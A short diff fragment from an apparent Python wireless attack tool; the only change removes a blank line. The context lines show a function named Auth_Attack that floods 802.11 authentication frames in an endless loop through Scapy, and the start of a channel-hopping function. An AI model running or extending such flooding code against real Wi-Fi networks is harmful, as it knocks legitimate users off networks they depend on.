@@ -21,7 +21,6 @@ def Auth_Attack(argu):
     frame = RadioTap()/dot11/Dot11Auth(seqnum=1)
     sendp(frame, iface=argu[0], inter=0.001, loop=1)
 
-
 def Hopping(args):
     ch = 0
     while(1):
